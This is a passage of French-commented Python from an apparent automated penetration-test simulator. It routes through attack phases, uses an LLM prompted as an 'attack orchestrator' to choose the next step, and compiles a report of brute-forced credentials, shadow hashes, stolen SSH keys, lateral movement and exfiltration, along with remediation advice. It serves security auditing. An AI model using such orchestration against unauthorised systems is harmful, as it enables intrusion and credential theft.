        # =====================================================================
        if actual_step == SimulatorStep.LATERAL_MOVEMENT:
            state["already_done"].append(SimulatorStep.LATERAL_MOVEMENT.value)
            return "exfiltration"

        # =====================================================================
        # Exfiltration → toujours Defense Evasion
        # =====================================================================
        if actual_step == SimulatorStep.EXFILTRATION:
            state["already_done"].append(SimulatorStep.EXFILTRATION.value)
            return "defense_evasion"

        # =====================================================================
        # Defense Evasion → Persistence
        # =====================================================================
        if actual_step == SimulatorStep.DEFENSE_EVASION:
            state["already_done"].append(SimulatorStep.DEFENSE_EVASION.value)
            return "persistence" if SimulatorStep.PERSISTENCE not in state["already_done"] else "report"

        # =====================================================================
        # Persistence → Report
        # =====================================================================
        if actual_step == SimulatorStep.PERSISTENCE:
            state["already_done"].append(SimulatorStep.PERSISTENCE.value)
            return "report"

        # =====================================================================
        # Report → end
        # =====================================================================
        if actual_step == SimulatorStep.REPORT:
            state["already_done"].append(SimulatorStep.REPORT.value)
            return "end"

        return "end"

    except Exception as e:
        state.setdefault("pivot_errors", []).append(f"graph_conditional_edge: {str(e)}")
        return "end"
    
async def graph_conditional_edge_with_llm(state: Dict[str, Any]) -> str:
    """
    Edge conditionnel avec LLM : version intelligente du routage.
    
    À implémenter : utilise un modèle de langage pour prendre des décisions
    plus sophistiquées sur la prochaine étape en fonction du contexte.
    Actuellement non implémenté, retombe sur la logique par défaut.
    
    Args:
        state (Dict[str, Any]): État courant du simulateur
    
    Returns:
        str: Prochain nœud ("end" par défaut en cas d'erreur)
    """
    state.setdefault("pivot_errors", [])
    state.setdefault("already_done", [])
    state.setdefault("actual_step", "")
    actual_step = state.get("actual_step", "")
    step_val = str(actual_step.value) if hasattr(actual_step, 'value') else str(actual_step)
    show = True
    if step_val and step_val.lower().strip() in [s.value.lower().strip() for s in SimulatorStep]:
    # if actual_step and actual_step.value.lower().strip() in [step.value.lower().strip() for step in SimulatorStep]:
        state["already_done"].append(SimulatorStep(actual_step).value)
    
    if show:
        print(f"state already_done: {state['already_done']}, {actual_step}")
    
    try:
        prompt = build_prompt(state)
        
        system = (
            "Tu es un orchestrateur d'attaque. Analyse l'état et décide de la "
            "prochaine action. Réponds UNIQUEMENT par le nom de l'action.\n"
        )
        llm = state["llm"]
        response = await llm.call(
            system=system,
            prompt=prompt,
            max_tokens=50,
            temperature=0.0,
        )
        if show:
            print("Llm manager response: ", response)
        if response.get("success", False):
            action_llm = response.get('response', '').strip().lower().replace("_", "")
            if show:
                print("Action llm:", action_llm)
            for action in ALL_ACTIONS:
                if action_llm in action.strip().lower().replace("_", ""):
                    if action.lower() == "end":
                        return "end"
                    if not action in state.get("already_done", []):
                        if show:
                            print("return : ", ACTIONS_MAPPING[action])
                        return ACTIONS_MAPPING[action]
        
        return graph_conditional_edge(state)
    except Exception as e:
        if "pivot_errors" not in state:
            state["pivot_errors"] = [f"graph_conditional_edge_with_llm: {str(e)}"]
        else:
            state["pivot_errors"].append(f"graph_conditional_edge_with_llm: {str(e)}")
        
        if show:
            print("ERRREUR DANS FONCTION: ", str(e))
            import traceback
            traceback.print_exc()
    return "end"


# async def graph_report(state: Dict[str, Any]) -> Dict[str, Any]:
#     """
#     Nœud de rapport : génération du rapport final.
    
#     À implémenter selon les besoins : synthèse des actions effectuées,
#     compilation des résultats, formatage du rapport.
    
#     Args:
#         state (Dict[str, Any]): État final du simulateur
    
#     Returns:
#         Dict[str, Any]: État inchangé (ou enrichi du rapport)
#     """
#     # Initialisation sécurisée des dictionnaires
#     state.setdefault("steps_results", {})
#     state.setdefault("success_dict", {})
#     state.setdefault("error_dict", {})
#     state.setdefault("actual_action", [])
#     state.setdefault("already_done", [])
#     state.setdefault("pivot_errors", [])
    
#     try:
#         state["actual_step"] = SimulatorStep.REPORT.value
#         # TODO: Implémenter la génération du rapport
#         pass
#     except:
#         pass
        
#     return state


async def graph_report(state: Dict[str, Any]) -> Dict[str, Any]:
    """
    Nœud de rapport : génération du rapport final.
    
    À implémenter selon les besoins : synthèse des actions effectuées,
    compilation des résultats, formatage du rapport.
    
    Args:
        state (Dict[str, Any]): État final du simulateur
    
    Returns:
        Dict[str, Any]: État inchangé (ou enrichi du rapport)
    """
    state.setdefault("steps_results", {})
    state.setdefault("success_dict", {})
    state.setdefault("error_dict", {})
    state.setdefault("created_files", [])
    
    state["actual_step"] = SimulatorStep.REPORT.value
    target_ip = state.get("ip", "Inconnue")
    
    # Structure de données principale du rapport
    report_data = {
        "metadata": {
            "target_ip": target_ip,
            "generated_at": datetime.now(tz=timezone.utc).isoformat(),
            "status": "Terminé",
            "simulator_version": "2.0.0"
        },
        "executive_summary": {
            "compromised": False,
            "root_access": state.get("privilege_escalation_success", False),
            "credentials_harvested_count": 0,
            "lateral_movement_hosts_count": 0,
            "persistence_installed_count": 0,
            "criticality_level": "FAIBLE"
        },
        "mitre_attack_matrix": {},
        "compromised_data": {
            "ports_discovered": [],
            "credentials": [],
            "system_hashes": [],
            "stolen_ssh_keys": [],
            "known_hosts_discovered": [],
            "lateral_hosts_compromised": [],
            "exfiltrated_payloads_count": 0,
            "created_files_on_target": list(set(state.get("created_files", [])))
        },
        "technical_timeline": [],
        "remediation_plan": []
    }

    steps_results = state.get("steps_results", {})
    success_dict = state.get("success_dict", {})

    # 1. Traitement de la matrice MITRE ATT&CK et de la chronologie
    for key, success in success_dict.items():
        if "|" in key:
            technique, tactic = key.split("|", 1)
        else:
            technique, tactic = key, "Inconnue"
            
        report_data["mitre_attack_matrix"].setdefault(tactic, {})[technique] = {
            "status": "SUCCÈS" if success else "ÉCHEC",
            "errors": state.get("error_dict", {}).get(key, [])
        }
        
        report_data["technical_timeline"].append({
            "tactic": tactic,
            "technique": technique,
            "success": success
        })

    # 2. Analyse ciblée des résultats par module réel
    
    # --- Reconnaissance ---
    recon_entries = steps_results.get("NetworkServiceDiscover|Reconnaissance", [])
    for entry in recon_entries:
        res = entry.get("result", {}).get("results", {})
        if "open_ports" in res:
            report_data["compromised_data"]["ports_discovered"] = res["open_ports"]

    # --- Initial Access (Bruteforce SSH, FTP, HTTP) ---
    for key in steps_results:
        if "InitialAccess" in key:
            for entry in steps_results[key]:
                res = entry.get("result", {}).get("results", {})
                founds = res.get("founds", [])
                service_name = key.split("|")[0].replace("BruteForce", "").lower()
                
                for item in founds:
                    if service_name == "http":
                        report_data["compromised_data"]["credentials"].append({
                            "service": "http",
                            "port": entry.get("port", "80"),
                            "username": "[Chemin Découvert]",
                            "password": item.get("url", item.get("path", ""))
                        })
                    else:
                        report_data["compromised_data"]["credentials"].append({
                            "service": service_name,
                            "port": entry.get("port", "22"),
                            "username": item.get("username", ""),
                            "password": item.get("password", "")
                        })

    # --- Privilege Escalation (SudoExploit, SUIDBinary) ---
    for key in ["SudoExploit|PrivilegeEscalation", "SUIDBinary|PrivilegeEscalation"]:
        entries = steps_results.get(key, [])
        for entry in entries:
            res = entry.get("result", {}).get("results", {})
            exploit_success = res.get("exploit_success", [])
            if exploit_success:
                report_data["executive_summary"]["root_access"] = True

    # --- Credential Access (PasswordFileDump, BashHistoryRead, SSHKeyTheft) ---
    # Shadow dumps
    dump_entries = steps_results.get("PasswordFileDump|CredentialAccess", [])
    for entry in dump_entries:
        res = entry.get("result", {}).get("results", {})
        for h in res.get("hashes", []):
            report_data["compromised_data"]["system_hashes"].append({
                "user": h.get("user"),
                "algo": h.get("algo"),
                "hash": h.get("hash")
            })

    # Bash History
    history_entries = steps_results.get("BashHistoryRead|CredentialAccess", [])
    for entry in history_entries:
        res = entry.get("result", {}).get("results", {})
        for c in res.get("credentials_found", []):
            report_data["compromised_data"]["credentials"].append({
                "service": f"bash_history_leak ({c.get('type')})",
                "port": "local",
                "username": c.get("source", "unknown"),
                "password": c.get("line", "")
            })

    # SSH Keys stolen
    theft_entries = steps_results.get("SSHKeyTheft|CredentialAccess", [])
    for entry in theft_entries:
        res = entry.get("result", {}).get("results", {})
        for k in res.get("stolen_keys", []):
            report_data["compromised_data"]["stolen_ssh_keys"].append({
                "name": k.get("name"),
                "source": k.get("source"),
                "type": k.get("type"),
                "usable": k.get("usable")
            })
        for h in res.get("known_hosts", []):
            report_data["compromised_data"]["known_hosts_discovered"].append(h)

    # --- Lateral Movement ---
    lateral_entries = steps_results.get("SSHLateralMovement|LateralMovement", [])
    for entry in lateral_entries:
        res = entry.get("result", {}).get("results", {})
        sessions = res.get("sessions", {})
        for marker, info_list in sessions.items():
            info = info_list[0] if isinstance(info_list, list) and info_list else info_list
            report_data["compromised_data"]["lateral_hosts_compromised"].append({
                "target": marker,
                "user": info.get("username"),
                "auth_method": info.get("auth_method")
            })
    report_data["executive_summary"]["lateral_movement_hosts_count"] = len(
        report_data["compromised_data"]["lateral_hosts_compromised"]
    )

    # --- Exfiltration ---
    exfil_entries = steps_results.get("ExfiltrationHTTP|Exfiltration", [])
    for entry in exfil_entries:
        res = entry.get("result", {}).get("results", {})
        report_data["compromised_data"]["exfiltrated_payloads_count"] += res.get("sent_count", 0)

    # --- Persistence ---
    for key in steps_results:
        if "Persistence" in key:
            for entry in steps_results[key]:
                res = entry.get("result", {}).get("results", {})
                # Si l'injection est confirmée dans les résultats
                success = res.get("success", False) or res.get("inject", {}).get("success", False)
                if success:
                    report_data["executive_summary"]["persistence_installed_count"] += 1

    # 3. Calculs globaux de criticité
    cred_count = len(report_data["compromised_data"]["credentials"])
    hash_count = len(report_data["compromised_data"]["system_hashes"])
    keys_count = sum(1 for k in report_data["compromised_data"]["stolen_ssh_keys"] if k["usable"])
    
    total_leaked = cred_count + hash_count + keys_count
    report_data["executive_summary"]["credentials_harvested_count"] = total_leaked
    
    if total_leaked > 0 or report_data["compromised_data"]["lateral_hosts_compromised"]:
        report_data["executive_summary"]["compromised"] = True
        report_data["executive_summary"]["criticality_level"] = "ÉLEVÉ"
        
    if report_data["executive_summary"]["root_access"]:
        report_data["executive_summary"]["compromised"] = True
        report_data["executive_summary"]["criticality_level"] = "CRITIQUE"

    # 4. Élaboration du plan de remédiation
    remediation = report_data["remediation_plan"]
    if cred_count > 0:
        remediation.append({
            "vulnerability": "Utilisation d'identifiants de services par défaut ou trop simples",
            "impact": "Permet un accès initial rapide à distance ou l'authentification sur des services critiques.",
            "mitigation": "Implémenter une politique stricte de robustesse pour les mots de passe et désactiver l'authentification par mot de passe SSH au profit des clés publiques."
        })
    if report_data["executive_summary"]["root_access"]:
        remediation.append({
            "vulnerability": "Permissions SUID non sécurisées ou configurations Sudoers laxistes (NOPASSWD)",
            "impact": "Élévation de privilèges locale permettant d'obtenir le contrôle total (Root) de l'hôte.",
            "mitigation": "Auditer le fichier `/etc/sudoers` pour restreindre l'usage de NOPASSWD aux seuls binaires nécessaires, et retirer le bit SUID (`chmod u-s`) des utilitaires non système."
        })
    if keys_count > 0:
        remediation.append({
            "vulnerability": "Présence de clés SSH privées non chiffrées sur le disque",
            "impact": "Vol direct de clés permettant de compromettre de multiples serveurs cibles via rebond (mouvement latéral).",
            "mitigation": "Protéger obligatoirement chaque clé privée générée à l'aide d'une phrase de passe robuste (passphrase) et configurer des permissions d'accès restrictives (`chmod 600`)."
        })
    if report_data["executive_summary"]["persistence_installed_count"] > 0:
        remediation.append({
            "vulnerability": "Mécanismes de persistance active installés (tâches Cron / configurations Startup / clés SSH autorisées)",
            "impact": "Maintien d'un accès distant furtif et persistant pour l'attaquant, même après redémarrage.",
            "mitigation": "Vérifier régulièrement l'intégrité de `/etc/cron*`, inspecter les fichiers `~/.ssh/authorized_keys` de tous les utilisateurs et désactiver les scripts de démarrage suspects."
        })

    if not remediation:
        remediation.append({
            "vulnerability": "Aucune faiblesse critique majeure n'a été exploitée avec succès.",
            "impact": "Risque d'intrusion limité sur le périmètre évalué.",
            "mitigation": "Continuer les audits périodiques et maintenir les dépendances et systèmes d'exploitation à jour."
        })

    state["report"] = report_data
    _save_report_files(target_ip, report_data)
    
    return state

def _save_report_files(target_ip: str, report: dict):
    """Enregistre le rapport consolidé sous format JSON brut et Markdown."""
    os.makedirs("reports", exist_ok=True)
    clean_ip = target_ip.replace(".", "_").replace(":", "_")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    dir_ = f"audit_{clean_ip}_{timestamp}"
    base_path = os.path.join(REPORT_DIR, dir_)
    os.makedirs(base_path, exist_ok=True)
    base_path = os.path.join(base_path, "report")
    
    # Sauvegarde JSON
    with open(f"{base_path}.json", "w", encoding="utf-8") as f:
        json.dump(report, f, indent=4, ensure_ascii=False, default=str)
        
    # Sauvegarde Markdown
    md = f"""# RAPPORT D'AUDIT DE SÉCURITÉ APPLICATIVE (SHIELDAI)
**Cible évaluée :** {target_ip}  
**Date d'exécution :** {report["metadata"]["generated_at"]}  
**Criticité globale calculée :** {report["executive_summary"]["criticality_level"]}

---

## 1. Résumé Exécutif
L'exercice d'intrusion simulée a produit les résultats suivants :
*   **Compromission confirmée :** {"OUI" if report["executive_summary"]["compromised"] else "NON"}
*   **Élévation de privilèges Root obtenue :** {"OUI" if report["executive_summary"]["root_access"] else "NON"}
*   **Identifiants techniques récoltés :** {report["executive_summary"]["credentials_harvested_count"]}
*   **Persistances implantées :** {report["executive_summary"]["persistence_installed_count"]}
*   **Machines réseau d'infrastructure compromises par rebond :** {report["executive_summary"]["lateral_movement_hosts_count"]}

---

## 2. Analyse des Vecteurs MITRE ATT&CK
"""
    for tactic, techniques in report["mitre_attack_matrix"].items():
        md += f"\n### Tactique : {tactic}\n"
        for tech, details in techniques.items():
            md += f"- **{tech}** : {details['status']}\n"
            if details["errors"]:
                md += f"  *Erreurs levées : {', '.join(details['errors'])}*\n"

    md += "\n## 3. Inventaire des Éléments Compromis\n"
    
    # Ports
    if report["compromised_data"]["ports_discovered"]:
        md += f"\n### Ports et Services ouverts détectés\n- {', '.join(map(str, report['compromised_data']['ports_discovered']))}\n"
    
    # Identifiants
    if report["compromised_data"]["credentials"]:
        md += "\n### Identifiants / Accès distants découverts\n"
        for c in report["compromised_data"]["credentials"]:
            md += f"- Port `{c['port']}` ({c['service']}) | Utilisateur : `{c['username']}` | Secret/Chemin : `{c['password']}`\n"
            
    # Shadow hashes
    if report["compromised_data"]["system_hashes"]:
        md += "\n### Empreintes de mots de passe système (/etc/shadow)\n"
        for h in report["compromised_data"]["system_hashes"]:
            md += f"- Utilisateur : `{h['user']}` | Algorithme : `{h['algo']}` | Hash : `{h['hash']}`\n"
            
    # Clés SSH
    if report["compromised_data"]["stolen_ssh_keys"]:
        md += "\n### Clés privées SSH récupérées sur le disque\n"
        for k in report["compromised_data"]["stolen_ssh_keys"]:
            status = "UTILISABLE DIRECTEMENT" if k["usable"] else "CHIFFRÉE"
            md += f"- Propriétaire : `{k['source']}` | Fichier : `{k['name']}` ({k['type']}) | Statut : `{status}`\n"

    # Mouvement latéral
    if report["compromised_data"]["lateral_hosts_compromised"]:
        md += "\n### Machines de rebond compromises (Lateral Movement)\n"
        for h in report["compromised_data"]["lateral_hosts_compromised"]:
            md += f"- Hôte cible : `{h['target']}` | Identifiant utilisé : `{h['user']}` | Authentification : `{h['auth_method']}`\n"

    # Exfiltration
    if report["compromised_data"]["exfiltrated_payloads_count"] > 0:
        md += f"\n### Données sensibles exfiltrées\n- **{report['compromised_data']['exfiltrated_payloads_count']}** payload(s) technique(s) transmis vers le serveur C2.\n"

    md += "\n## 4. Plan de Remédiation Préconisé\n"
    for i, rem in enumerate(report["remediation_plan"], 1):
        md += f"\n### {i}. {rem['vulnerability']}\n"
        md += f"**Impact :** {rem['impact']}  \n"
        md += f"**Mesure corrective :** {rem['mitigation']}  \n"

    with open(f"{base_path}.md", "w", encoding="utf-8") as f:
        f.write(md)